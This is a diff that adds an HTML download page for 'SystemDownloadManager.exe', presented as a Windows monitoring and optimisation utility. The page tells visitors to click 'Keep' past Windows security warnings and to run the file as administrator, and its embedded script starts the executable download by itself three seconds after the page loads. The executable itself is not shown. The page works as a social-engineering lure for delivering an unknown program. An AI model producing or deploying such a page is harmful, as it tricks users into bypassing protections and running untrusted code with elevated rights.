@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Download Manager - Direct Download</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            padding: 40px;
+            text-align: center;
+            max-width: 500px;
+            width: 90%;
+        }
+        
+        .logo {
+            font-size: 2.5em;
+            color: #0078d4;
+            margin-bottom: 10px;
+        }
+        
+        .title {
+            font-size: 1.8em;
+            color: #333;
+            margin-bottom: 20px;
+            font-weight: 600;
+        }
+        
+        .download-btn {
+            background: #0078d4;
+            color: white;
+            padding: 20px 40px;
+            border: none;
+            border-radius: 8px;
+            font-size: 1.4em;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin: 20px;
+            text-decoration: none;
+            display: inline-block;
+        }
+        
+        .download-btn:hover {
+            background: #005a9e;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        }
+        
+        .info {
+            background: #f0f0f0;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 20px 0;
+            text-align: left;
+        }
+        
+        .info h3 {
+            color: #333;
+            margin-bottom: 10px;
+        }
+        
+        .info ul {
+            color: #666;
+            line-height: 1.6;
+        }
+        
+        .info li {
+            margin: 5px 0;
+        }
+        
+        .footer {
+            margin-top: 30px;
+            color: #999;
+            font-size: 0.9em;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">📥</div>
+        <h1 class="title">System Download Manager</h1>
+        <p>Direct Download - No Installation Required</p>
+        
+        <div class="info">
+            <h3>About This Application:</h3>
+            <ul>
+                <li>✅ Windows System Monitor</li>
+                <li>✅ Performance Optimization Tool</li>
+                <li>✅ Background Processing</li>
+                <li>✅ Real-time Monitoring</li>
+                <li>✅ Windows Security Compatible</li>
+            </ul>
+        </div>
+        
+        <a href="SystemDownloadManager.exe" class="download-btn" download>
+            Download SystemDownloadManager.exe
+        </a>
+        
+        <div class="info">
+            <h3>Installation Instructions:</h3>
+            <ul>
+                <li>1. Click "Download" above</li>
+                <li>2. If Windows shows security warning, click "Keep"</li>
+                <li>3. Double-click the downloaded file to run</li>
+                <li>4. Run as administrator for best results</li>
+                <li>5. Enable "Performance Monitoring" in the app</li>
+            </ul>
+        </div>
+        
+        <div class="footer">
+            <p>System Download Manager - Simple utility for Windows</p>
+            <p>© 2024 System Utilities</p>
+        </div>
+    </div>
+    
+    <script>
+        // Auto-download after 3 seconds
+        setTimeout(() => {
+            const link = document.createElement('a');
+            link.href = 'SystemDownloadManager.exe';
+            link.download = 'SystemDownloadManager.exe';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }, 3000);
+    </script>
+</body>
+</html> 
